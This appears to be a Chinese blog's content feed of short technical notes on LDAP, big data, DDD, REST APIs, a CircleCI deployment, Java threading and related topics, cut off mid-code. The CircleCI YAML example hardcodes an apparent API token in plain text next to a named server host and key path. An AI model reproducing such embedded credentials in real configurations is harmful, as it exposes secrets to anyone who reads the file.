        <content type="html"><![CDATA[<p>LDAP是轻量目录访问协议，英文全称是Lightweight Directory Access Protocol，一般都简称为LDAP。它是基于X.500标准的，但是简单多了并且可以根据需要定制。与X.500不同，LDAP支持TCP/IP，这对访问Internet是必须的。LDAP的核心规范在RFC中都有定义，所有与LDAP相关的RFC都可以在LDAPman RFC网页中找到。</p><p>一般在大型企业IT架构中使用，用于维护一个中心化的用户账户和权限，例如JIRA、邮箱、WIKI等。另外一个实现是windows 的活动目录（AD）</p><p>OpenLDAP是LDAP协议的一个开源实现，具有组件：</p><ul><li>OpenLDAP OpenLDAP的服务器本身，目录服务器</li><li>phpLDAPadmin 管理图形界面</li><li>PWM 用户自主账号管理</li><li>客户端 （各个接入的应用自己实现，例如JIRA）</li></ul><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul><li>OpenLDAP 安装<a href="https://wiki.archlinux.org/index.php/OpenLDAP_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/OpenLDAP_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>微格式 (Microformat）</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/micro-format/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/micro-format/</url>
      
        <content type="html"><![CDATA[<p>微格式（Microformat），是通过语意相关让内容人机可读。网页上的允许的微格式数据包括事件、人物、地点等，它可以被其他的软件检测到，并提取出相应的信息，以及对信息进行索引、搜索、跨平台的参考，把这些信息以其他形式重复使用或组合。</p><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li><a href="https://schema.org" target="_blank" rel="noopener">https://schema.org</a></li><li><a href="http://microformats.org/" target="_blank" rel="noopener">http://microformats.org/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>web 视觉设计系统</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/design-system/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/design-system/</url>
      
        <content type="html"><![CDATA[<p>在做前端开发和设计时，遇到的一个问题是如何像让每个颜色、尺寸、组件全局统一，因此我们需要前端开发者和UX有一个统一的设计。</p><p>从而演化出自己的一套设计系统框架和项目模板，类似于 bootstrap和Foundation </p><h2 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h2><ul><li>css 设计系统汇总 <a href="https://github.com/topics/design-system?l=css" target="_blank" rel="noopener">https://github.com/topics/design-system?l=css</a></li><li>primer css <a href="https://github.com/primer/css" target="_blank" rel="noopener">https://github.com/primer/css</a></li><li>codyhouse framework <a href="https://github.com/CodyHouse/codyhouse-framework" target="_blank" rel="noopener">https://github.com/CodyHouse/codyhouse-framework</a></li></ul><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul><li>Design Systems: Building for the Future <a href="https://css-tricks.com/design-systems-building-future/" target="_blank" rel="noopener">https://css-tricks.com/design-systems-building-future/</a></li><li>Salesforce 提供的一套轻量级设计系统方案 <a href="https://www.lightningdesignsystem.com/utilities/alignment/" target="_blank" rel="noopener">https://www.lightningdesignsystem.com/utilities/alignment/</a></li><li>视频课程 <a href="https://www.lynda.com/CSS-tutorials/CSS-Design-Systems-Architectures/688549-2.html" target="_blank" rel="noopener">https://www.lynda.com/CSS-tutorials/CSS-Design-Systems-Architectures/688549-2.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>大数据概览</title>
      <link href="/bigdata/bigdata/overview-of-big-data/"/>
      <url>/bigdata/bigdata/overview-of-big-data/</url>
      
        <content type="html"><![CDATA[<p>大数据（big data），指无法在一定时间范围内用常规软件工具进行捕捉、管理和处理的数据集合，是需要新处理模式才能具有更强的决策力、洞察发现力和流程优化能力的海量、高增长率和多样化的信息资产。</p><p>5个维度描述大数据，Volume（大量）、Velocity（高速）、Variety（多样）、Value（低价值密度）、Veracity（真实性）</p><h2 id="程序员掌握的4个维度"><a href="#程序员掌握的4个维度" class="headerlink" title="程序员掌握的4个维度"></a>程序员掌握的4个维度</h2><ul><li>A AI</li><li>B Big data </li><li>C coding </li><li>D Devops</li></ul><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul><li>分布式存储 区别于传统的数据存储方式，由单机变成计算机集群来处理数据</li><li>大数据相关职位<ul><li>数据分析师</li><li>数据科学家</li><li>数据工程师</li></ul></li><li>数据工程的特征<ul><li>拓展性</li><li>容错性</li><li>弹性</li><li>可调式性</li><li>可维护性</li></ul></li><li>数据分区  将数据分散到多台机器上处理</li><li>数据映射 数据流和结构化数据之间的关系</li><li>排序</li><li>真实数据源</li><li>推与拉</li></ul><h2 id="相关技术"><a href="#相关技术" class="headerlink" title="相关技术"></a>相关技术</h2><ul><li>HDFS: Hadoop分布式文件系统(Distributed File System) － HDFS (Hadoop Distributed File System)</li><li>MapReduce：并行计算框架，0.20前使用 org.apache.hadoop.mapred 旧接口，0.20版本开始引入org.apache.hadoop.mapreduce的新API</li><li>HBase: 类似Google BigTable的分布式NoSQL列数据库。（HBase和Avro已经于2010年5月成为顶级 Apache 项目）</li><li>Hive：数据仓库工具，由Facebook贡献。</li><li>Zookeeper：分布式锁设施，提供类似Google Chubby的功能，由Facebook贡献。</li><li>Avro：新的数据序列化格式与传输工具，将逐步取代Hadoop原有的IPC机制。</li><li>Pig: 大数据分析平台，为用户提供多种接口。</li><li>Ambari：Hadoop管理工具，可以快捷的监控、部署、管理集群。</li><li>Sqoop：于在HADOOP与传统的数据库间进行数据的传递。</li><li>Spark: 用来做数据流处理</li><li>CDH： 企业级的部署工具 Cloud Distribution Hadoop</li></ul><h2 id="数据工程的4层架构"><a href="#数据工程的4层架构" class="headerlink" title="数据工程的4层架构"></a>数据工程的4层架构</h2><ul><li>Infrastracture<ul><li>AWS</li><li>GCP</li></ul></li><li>Data management and storage<ul><li>Hadoop DFS</li><li>Solr </li><li>Redis</li><li>AeroSpike</li><li>Asterix DB</li></ul></li><li>Data integration and process<ul><li>Kafka</li><li>Spark</li><li>Druid</li><li>beam</li><li>Flink</li><li>Storm</li><li>Google cloud DataFlow</li><li>Kinesis</li></ul></li><li>Coorination and Workflow management<ul><li>Airflow</li><li>Ozzie</li><li>Apache zookeeper</li><li>Apache Ambari</li><li>Talend</li></ul></li></ul><h2 id="最小工具集"><a href="#最小工具集" class="headerlink" title="最小工具集"></a>最小工具集</h2>]]></content>
      
      
      <categories>
          
          <category> bigdata </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>英文邮件写作</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/write-better-email/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/write-better-email/</url>
      
        <content type="html"><![CDATA[<h1 id="邮件标题"><a href="#邮件标题" class="headerlink" title="邮件标题"></a>邮件标题</h1><p>推荐使用动词、正面的词语</p><p>Not good:</p><blockquote><p>Could you review the pull request?</p></blockquote><p>Bat good:</p><blockquote><p>Approval for pull request</p></blockquote><h1 id="Greeting"><a href="#Greeting" class="headerlink" title="Greeting"></a>Greeting</h1><h2 id="称呼"><a href="#称呼" class="headerlink" title="称呼"></a>称呼</h2><p>称呼使用’Dear’ or ‘Hi’？Dear 比 Hi 正式</p><h2 id="称谓"><a href="#称谓" class="headerlink" title="称谓"></a>称谓</h2><p>姓、名不能混，如果不能分清楚称呼，使用 ‘please correct me if I was wrong’<br>如果对方有头衔，比如doctor，应该使用 doctor xxx</p><h1 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h1><p>TIPS</p><ol><li>开始直接表明来意， I am writing to xxx</li><li>意图明显，比如是为了report或者寻求帮助</li><li>结束方法：<ol><li>寻求更多communication</li><li>寻求Feedback</li><li>感谢</li><li>offer potential help</li></ol></li></ol><h1 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h1><p>1.使用Best regards<br>2.thanks</p><h1 id="summary-of-learn-points"><a href="#summary-of-learn-points" class="headerlink" title="summary of learn points"></a>summary of learn points</h1><p>the fundamentals of Email</p><ul><li>Subject - catching attention in a positive way</li><li>Greeting - appropriate</li><li>Purpose - state it at the beginning </li><li>Request - Be noticeable,clear and flexible</li><li>Ending - invite communication and off help </li><li>Sign-off - professional</li></ul><h1 id="something-is-suitable-via-email"><a href="#something-is-suitable-via-email" class="headerlink" title="something is suitable via email"></a>something is suitable via email</h1><ul><li>Need to record for future reference</li><li>Communication to multiple </li><li>The different time zone </li><li>Need someone take time to deal with</li><li>Report</li></ul><h1 id="something-is-not-suitable-via-email"><a href="#something-is-not-suitable-via-email" class="headerlink" title="something is not suitable via email"></a>something is not suitable via email</h1><ul><li>Urgent things </li><li>negative staff</li><li>complicated situation</li></ul><h1 id="Questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h1><ul><li>mark text as bold?</li><li>directly or indirectly</li><li>how to make a appropriate appreciation</li></ul>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>FastDFS 分布式文件系统方案</title>
      <link href="/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/fastDFS/"/>
      <url>/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/fastDFS/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>FastDFS是一个开源的轻量级分布式文件系统，它对文件进行管理，功能包括：文件存储、文件同步、文件访问（文件上传、文件下载）等，解决了大容量存储和负载均衡的问题。特别适合以文件为载体的在线服务，如相册网站、视频网站等等。</p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>上传</p><ol><li>client询问tracker上传到的storage，不需要附加参数；</li><li>tracker返回一台可用的storage；</li><li>client直接和storage通讯完成文件上传。</li></ol><p>下载</p><ol><li>client询问tracker下载文件的storage，参数为文件标识（卷名和文件名）；</li><li>tracker返回一台可用的storage；</li><li>client直接和storage通讯完成文件下载。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术组件 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>微软SDL( Security Development Lifecycle)流程</title>
      <link href="/%E5%AE%89%E5%85%A8/security/security-sevelopment-lifecycle/"/>
      <url>/%E5%AE%89%E5%85%A8/security/security-sevelopment-lifecycle/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>微软SDL( Security Development Lifecycle)流程，是一种专注于软件开发安全保障的流程，为了实现保证最终的用户安全，在软件开发各阶段中引入安全和隐私问题。</p><h2 id="项目中实践"><a href="#项目中实践" class="headerlink" title="项目中实践"></a>项目中实践</h2><p>在项目中使用微软提供的工具，绘制威胁建模图表，用于分析和分享安全建模</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>官网 <a href="http://www.microsoft.com/security/sdl/default.aspx" target="_blank" rel="noopener">http://www.microsoft.com/security/sdl/default.aspx</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Circle CI 基本使用</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/circleci%20basic/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/circleci%20basic/</url>
      
        <content type="html"><![CDATA[<h2 id="CircleCI是什么"><a href="#CircleCI是什么" class="headerlink" title="CircleCI是什么"></a>CircleCI是什么</h2><p>CircleCI is a continuous integration engine offered as SaaS and on premise.</p><h2 id="CircleCI特点"><a href="#CircleCI特点" class="headerlink" title="CircleCI特点"></a>CircleCI特点</h2><ul><li>容易和Github集成</li><li>SasS平台，无需自己搭建环境</li></ul><h2 id="有用的资源"><a href="#有用的资源" class="headerlink" title="有用的资源"></a>有用的资源</h2><ul><li>官网：<a href="https://circleci.com/" target="_blank" rel="noopener">https://circleci.com/</a></li><li>文档：<a href="https://circleci.com/docs/" target="_blank" rel="noopener">https://circleci.com/docs/</a></li><li>技术雷达的演讲keynote：<a href="http://wiki.printf.cn/media/CIrcleCI%20on%20tech%20Radar.key">http://wiki.printf.cn/media/CIrcleCI%20on%20tech%20Radar.key</a></li></ul><h2 id="一个构建java并部署的例子"><a href="#一个构建java并部署的例子" class="headerlink" title="一个构建java并部署的例子"></a>一个构建java并部署的例子</h2><pre><code class="yaml">version: 2jobs:  build:    machine:      java:        version: oraclejdk8    working_directory: ~/whoisspy    steps:      - checkout      - run: ./gradlew clean build      - store_artifacts:          path: build/libs  deploy:    machine: true    working_directory: ~/whoisspy    steps:      - checkout      - run:          name: Display current position          command: pwd      - run:          name: Display those variables          command: env      - run:          name: Download jar file          command: |            export CIRCLE_TOKEN=&#39;?circle-token=93106a0b530273d9cb344ea608bc609490fdf202&#39;            curl https://circleci.com/api/v1.1/project/github/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME/$CIRCLE_PREVIOUS_BUILD_NUM/artifacts$CIRCLE_TOKEN | grep -o &#39;https://[^&quot;]*&#39; &gt; artifacts.txt            &lt;artifacts.txt xargs -P4 -I % wget %      - run:          name: Display whole list          command: ls -al &amp; aws --version      - run:          name: Change permission for aws.pem          command: chmod 0600 .circleci/aws.pem      - run:          name: SCP file to instance          command: scp -i &quot;./.circleci/aws.pem&quot; whoisspy-0.0.1-SNAPSHOT.jar ubuntu@ec2-18-217-113-62.us-east-2.compute.amazonaws.com:/home/ubuntu/workspace/whoisspy-0.0.1-SNAPSHOT.jar      - run:          name: login to target instance          command: |            ssh -i &quot;./.circleci/aws.pem&quot; ubuntu@ec2-18-217-113-62.us-east-2.compute.amazonaws.com &#39;ls            cd workspace            #kill old instance            output=$( netstat -apn | grep 8086 | grep LISTEN) &amp;&amp; read num1 num2 num3 num4 num5  &lt;&lt;&lt;${output//[^0-9]/ } &amp;&amp; kill -9 $num5 || pwd            # todo start new instance            java -jar whoisspy-0.0.1-SNAPSHOT.jar &gt; /dev/null 2&gt;&amp;1 &amp;            # test if it has been started            netstat -apn | grep 8086&#39;      - run:          name: last step          command: pwd#      - run:#          name: kill ssh process#          command: |##            pid=$( ps aux | grep amazonaws | awk &#39;{print $2}&#39; | sort -n | head -n 1 )#            sleep 5 &amp;&amp; kill ${pid} &amp;&amp; echo &quot;ssh command is complete&quot;workflows:  version: 2  build-deploy:    jobs:      - build      - deploy:          requires:            - build          filters:            branches:              only: set-ci</code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>DDD (Domain-Driven Design) 领域驱动设计</title>
      <link href="/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/Domain%20Driven%20Design/"/>
      <url>/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/Domain%20Driven%20Design/</url>
      
        <content type="html"><![CDATA[<h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><p>DDD是一套综合软件系统分析和设计的面向对象建模方法，与此相似的工程方法还有 RUP（统一建模语言）。DDD解决的问题是应用复杂问题下的建模问题。</p><p>开发团队和领域专家（业务专家）一起通过通用语言(Ubiquitous Language)去理解和消化领域知识，从领域知识中提取和划分为一个一个的子领域（核心子域，通用子域，支撑子域），并在子领域上建立模型，再重复以上步骤，这样周而复始，构建出一套符合当前领域的模型。</p><p>在这个过程中有一个很重要的方法就是糊墙，又叫 EventStorming。</p><h2 id="统一语言"><a href="#统一语言" class="headerlink" title="统一语言"></a>统一语言</h2><p>通用语言是一个很泛的概念，它作为一种沟通工具，在开发团队内部，开发团队与领域专家之间使用。它包含了自然语言、文档和图表（不一定是标准的UML图，只要能表达出领域知识的都可以）等内容。对通用语言中名词，动词的使用需要认真考量，因为这些名词和动词会作为后面模型的指导命名。</p><p>统一语言本质上是在领域设计时候，预先定义下系统中出现的概念、名词以及解释。</p><p>例如在一个报销系统中，报销单据的提交前端和业务人员使用了ticket、后端应用使用了 bill，数据库如果也是用了其他的名词，在多团队、微服务设计下势必会造成混乱。</p><p>再比如在电商系统中，订单这个概念会指普通订单、支付订单、售后订单，如果只是使用 order 又会造成混乱，统一语言的目的是预先定义出领域概念。</p><ul><li>订单 order</li><li>支付单 payment</li><li>售后单 ticket</li></ul><p>解决统一语言的问题：</p><ul><li>在白板上表达您的业务领域</li><li>定义开发所有术语的词汇表</li><li>领域专家和开发人员可以使用Event Storming实现业务流程学习的快速循环</li></ul><h2 id="战略设计"><a href="#战略设计" class="headerlink" title="战略设计"></a>战略设计</h2><p>它也称为战略建模，它是DDD的支柱，其主要目标是与整个项目团队（领域专家和技术团队）一起定义有界上下文，统一的无所不在语言和上下文映射。</p><h3 id="有界上下文-限界上下文"><a href="#有界上下文-限界上下文" class="headerlink" title="有界上下文/限界上下文"></a>有界上下文/限界上下文</h3><p>有界上下文是DDD最重要的概念之一，我们可以说这是应用领域模型表达的概念上的限制。当您尝试为大型领域建模时，您将遇到很大的困难，因为不同的人群将使用稍微不同的术语和句子来表达这些领域知识和概念，使用有界上下文，可以让人们明白：在当前上下文之外使用相同的词汇表却可能意味着不同的东西。</p><p>我们可以说，有界上下文主要是语言划界，正如[ Vaughn Vernon ]在他的书中所说的那样。重要的是要理解每个有界上下文都有自己的无所不在语言。</p><p>随着模型的发展，您将感觉需要在有界上下文之间创建关系，为此我们将使用上下文映射。</p><h3 id="上下文映射​​​​​​​"><a href="#上下文映射​​​​​​​" class="headerlink" title="上下文映射​​​​​​​"></a>上下文映射​​​​​​​</h3><p>上下文映射有助于理解整个项目，能够显示不同的有界上下文之间的关系。理解有界上下文之间的关系非常重要，这样您就可以正确地构建域模型。</p><p>有几种方法可以关联有界上下文：</p><ul><li>共享内核：两个或多个团队之间的共享上下文，可减少代码重复，但是，任何更改都必须在团队之间进行组合和通知。</li><li>客户/供应商：它是客户端（下游）和服务器（上游）之间的关系，团队处于持续集成状态。</li><li>循规蹈矩Conformist：这是涉及上游和下游团队的情景，但在此模型中，上游团队没有动力满足下游团队的需求。</li><li>伙伴：这是团队依赖并需要建立合作关系的场景，以便他们能够满足两个系统的开发需求。</li><li>反腐败层：在这种情况下，客户端（下游）创建与上游上下文通信的中间层，以满足其自己的域模型。</li><li>还有其他集成模型，如开放主机服务Published Language，发布语言，分离方式Separate Ways。</li></ul><h2 id="战术设计"><a href="#战术设计" class="headerlink" title="战术设计"></a>战术设计</h2><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>一个实体是一个潜在的可变对象，它具有一个唯一的标识符。实体在其域模型中具有自己的生命周期，这使您可以获取此实体的整个变化的历史记录。</p><h3 id="值对象"><a href="#值对象" class="headerlink" title="值对象"></a>值对象</h3><p>区分值对象与实体的区别在于，值对象是不可变的，并且没有唯一标识，仅由其属性的值定义。这种不变性的结果是，为了更新值对象，您必须创建一个新实例来替换旧实例。</p><h3 id="聚合Aggregates"><a href="#聚合Aggregates" class="headerlink" title="聚合Aggregates"></a>聚合Aggregates</h3><p>它是战术设计中最重要和最复杂的模式之一，聚合基于另外两个战术标准，即实体和值对象。聚合是一种或多种的群集实体，并且还可以包含值对象。此群集的父实体接收聚合根的名称。</p><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><p>服务是无状态对象，它们执行一些不适合实体或值对象上的操作的逻辑。它们执行特定于域的操作，这可能涉及多个域对象。</p><h3 id="库Repository"><a href="#库Repository" class="headerlink" title="库Repository"></a>库Repository</h3><p>存储库主要用于处理存储，它们抽象了对数据存储的依赖担忧。他们负责持久聚合。</p><h3 id="工厂"><a href="#工厂" class="headerlink" title="工厂"></a>工厂</h3><p>工厂用于在构造Object时提供抽象，并且可以返回聚合根，实体或值对象。工厂是构建通过构造方法构建复杂的对象的替代方法。</p><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>事件表示域中发生的重大事件，需要向属于域的其他利益相关者报告。Aggregates通常发布事件。</p><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>开发人员很少提及模块，但是它们的使用非常有趣。模块帮助我们隔离概念，可以定义为Java包或C＃命名空间，并始终遵循泛在语言。</p><h2 id="Eventstorming"><a href="#Eventstorming" class="headerlink" title="Eventstorming"></a>Eventstorming</h2><h2 id="子域的种类"><a href="#子域的种类" class="headerlink" title="子域的种类"></a>子域的种类</h2><ul><li>核心子域</li><li>通用子域 （特殊的支撑子域）</li><li>支撑子域</li></ul>]]></content>
      
      
      <categories>
          
          <category> 理论方法 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>API RESTful 风格</title>
      <link href="/API%E8%AE%BE%E8%AE%A1/restful-api/api-restful/"/>
      <url>/API%E8%AE%BE%E8%AE%A1/restful-api/api-restful/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>REST（英文：Representational State Transfer，简称REST），RESTful是一种对基于HTTP的应用设计风格，只是提供了一组设计原则和约束条件，而不是一种标准。网络上有大量对RESTful风格的解读，简单来说Restful定义URI和HTTP状态码，让你的API设计变得更简洁、清晰和富有层次，对缓存等实现更有帮助。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>个人博客 <a href="http://www.printf.cn/index.php/archives/api-design-restful.html" target="_blank" rel="noopener">http://www.printf.cn/index.php/archives/api-design-restful.html</a></li><li>JSON API 参考规范 <a href="http://jsonapi.org/format/" target="_blank" rel="noopener">http://jsonapi.org/format/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> API设计 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>API 文档和契约</title>
      <link href="/API%E8%AE%BE%E8%AE%A1/restful-api/api-document-and-contract/"/>
      <url>/API%E8%AE%BE%E8%AE%A1/restful-api/api-document-and-contract/</url>
      
        <content type="html"><![CDATA[<p>实现API文档生成和前后端合作的几种方案。</p><ul><li><p>基于注释的 API 文档：这是一种通过代码中注释生成 API 文档的轻量级方案，它的好处是简单易用，基本与编程语言无关。因为基于注释，非常适合动态语言的文档输出，例如 Nodejs、PHP、Python。由于NPM包容易安装和使用，这里推荐 nodejs 平台下的 apidocjs。</p></li><li><p>基于反射的 API 文档：使用 swagger 这类通过反射来解析代码，只需要定义好 Model，可以实现自动输出 API 文档。这种方案适合强类型语言例如 Java、.Net，尤其是生成一份稳定、能在团队外使用的 API 文档。</p></li><li><p>使用契约进行前后端协作：在团队内部，前后端协作本质上需要的不是一份 API 文档，而是一个可以供前后端共同遵守的契约。前后端可以一起制定一份契约，使用这份契约共同开发，前端使用这份契约 mock API，后端则可以通过它简单的验证API是否正确输出。</p></li></ul><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>博客 <a href="http://www.printf.cn/index.php/archives/api-design-document-and-contract.html" target="_blank" rel="noopener">http://www.printf.cn/index.php/archives/api-design-document-and-contract.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> API设计 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Javascript 清理对象中的空值</title>
      <link href="/Javascript/javascript/clean-empty-attribute-in-object/"/>
      <url>/Javascript/javascript/clean-empty-attribute-in-object/</url>
      
        <content type="html"><![CDATA[<pre><code>export function cleanNull(object){  const returnValue = {}  Object.keys(object).map((key)=&gt;{    const value = object[key]    if (value === undefined || value === null || value === &#39;&#39;) {      return    }    returnValue[key] = value    return key  })  return returnValue}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Javascript </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 并发和多线程</title>
      <link href="/java/java/java-cocurrent/"/>
      <url>/java/java/java-cocurrent/</url>
      
        <content type="html"><![CDATA[<h2 id="Java-多线程的几种实现方式"><a href="#Java-多线程的几种实现方式" class="headerlink" title="Java 多线程的几种实现方式"></a>Java 多线程的几种实现方式</h2><h3 id="通过实现-Runnable-接口；"><a href="#通过实现-Runnable-接口；" class="headerlink" title="通过实现 Runnable 接口；"></a>通过实现 Runnable 接口；</h3><pre><code class="java">class RunnableDemo implements Runnable {   private Thread t;   private String threadName;   RunnableDemo( String name) {      threadName = name;      System.out.println(&quot;Creating &quot; +  threadName );   }   public void run() {      System.out.println(&quot;Running &quot; +  threadName );      try {         for(int i = 4; i &gt; 0; i--) {            System.out.println(&quot;Thread: &quot; + threadName + &quot;, &quot; + i);            // 让线程睡眠一会            Thread.sleep(50);         }      }catch (InterruptedException e) {         System.out.println(&quot;Thread &quot; +  threadName + &quot; interrupted.&quot;);      }      System.out.println(&quot;Thread &quot; +  threadName + &quot; exiting.&quot;);   }   public void start () {      System.out.println(&quot;Starting &quot; +  threadName );      if (t == null) {         t = new Thread (this, threadName);         t.start ();      }   }}public class TestThread {   public static void main(String args[]) {      RunnableDemo R1 = new RunnableDemo( &quot;Thread-1&quot;);      R1.start();      RunnableDemo R2 = new RunnableDemo( &quot;Thread-2&quot;);      R2.start();   }   }</code></pre><h3 id="通过继承Thread来创建线程"><a href="#通过继承Thread来创建线程" class="headerlink" title="通过继承Thread来创建线程"></a>通过继承Thread来创建线程</h3><pre><code class="java">class ThreadDemo extends Thread {   private Thread t;   private String threadName;   ThreadDemo( String name) {      threadName = name;      System.out.println(&quot;Creating &quot; +  threadName );   }   public void run() {      System.out.println(&quot;Running &quot; +  threadName );      try {         for(int i = 4; i &gt; 0; i--) {            System.out.println(&quot;Thread: &quot; + threadName + &quot;, &quot; + i);            // 让线程睡眠一会            Thread.sleep(50);         }      }catch (InterruptedException e) {         System.out.println(&quot;Thread &quot; +  threadName + &quot; interrupted.&quot;);      }      System.out.println(&quot;Thread &quot; +  threadName + &quot; exiting.&quot;);   }   public void start () {      System.out.println(&quot;Starting &quot; +  threadName );      if (t == null) {         t = new Thread (this, threadName);         t.start ();      }   }}public class TestThread {   public static void main(String args[]) {      ThreadDemo T1 = new ThreadDemo( &quot;Thread-1&quot;);      T1.start();      ThreadDemo T2 = new ThreadDemo( &quot;Thread-2&quot;);      T2.start();   }   }</code></pre><h3 id="通过-Callable-和-Future-创建线程"><a href="#通过-Callable-和-Future-创建线程" class="headerlink" title="通过 Callable 和 Future 创建线程"></a>通过 Callable 和 Future 创建线程</h3><pre><code class="java">public class CallableThreadTest implements Callable&lt;Integer&gt; {    public static void main(String[] args)      {          CallableThreadTest ctt = new CallableThreadTest();          FutureTask&lt;Integer&gt; ft = new FutureTask&lt;&gt;(ctt);          for(int i = 0;i &lt; 100;i++)          {              System.out.println(Thread.currentThread().getName()+&quot; 的循环变量i的值&quot;+i);              if(i==20)              {                  new Thread(ft,&quot;有返回值的线程&quot;).start();              }          }          try          {              System.out.println(&quot;子线程的返回值：&quot;+ft.get());          } catch (InterruptedException e)          {              e.printStackTrace();          } catch (ExecutionException e)          {              e.printStackTrace();          }      }    @Override      public Integer call() throws Exception      {          int i = 0;          for(;i&lt;100;i++)          {              System.out.println(Thread.currentThread().getName()+&quot; &quot;+i);          }          return i;      }  }</code></pre><h3 id="创建线程的三种方式的对比"><a href="#创建线程的三种方式的对比" class="headerlink" title="创建线程的三种方式的对比"></a>创建线程的三种方式的对比</h3><ol><li>采用实现 Runnable、Callable 接口的方式创建多线程时，线程类只是实现了 Runnable 接口或 Callable 接口，还可以继承其他类。</li><li>使用继承 Thread 类的方式创建多线程时，编写简单，如果需要访问当前线程，则无需使用 Thread.currentThread() 方法，直接使用 this 即可获得当前线程。</li><li>推荐使用 Callbale 方式，因为可以得到线程中的返回值和异常</li></ol><h2 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h2><p>多线程代码中，变量会存在共享，但是如果操作不是原子性的，会造成一致性的问题。 在保证线程安全中Java提供了一些措施。</p><h3 id="同步操作和只读操作"><a href="#同步操作和只读操作" class="headerlink" title="同步操作和只读操作"></a>同步操作和只读操作</h3><p>1.方法的调用是在栈中完成的，因此方法的调用不会造成线程安全的问题。这也是为什么Spring 中使用Bean管理对象，每一次请求的操作可以视为同步行为，可以避免多线程问题。</p><p>2.Java中一些对象是线程安全的，是通过使用了只读操作完成的，例如每一个String都是新的对象，在解决线程安全问题的同时需要注意性能问题。</p><h3 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h3><p>Java语言提供了一种稍弱的同步机制，即volatile变量，用来确保将变量的更新操作通知到其他线程。当把变量声明为volatile类型后，编译器与运行时都会注意到这个变量是共享的，因此不会将该变量上的操作与其他内存操作一起重排序。volatile变量不会被缓存在寄存器或者对其他处理器不可见的地方，因此在读取volatile类型的变量时总会返回最新写入的值。</p><p>volatile 并不能解决线程安全问题，但是需要注意，赋值操作不是原子性的，因此需要使用volatile来保证变量的可见性。</p><h3 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h3><p>synchronized 有两种使用方法同步代码块和同步方法，同步代码块可以传入一个需要锁定的对象，通常是this，而同步方法可以用来修饰方法</p><pre><code class="java">synchronized void f() { /* body */ }void f() { synchronized(this) { /* body */ } }</code></pre><p>需要注意的是如果是类当中的静态变量 synchronized 并不会锁住</p><p>需要使用类名来锁</p><pre><code class="java">synchronized void f() { 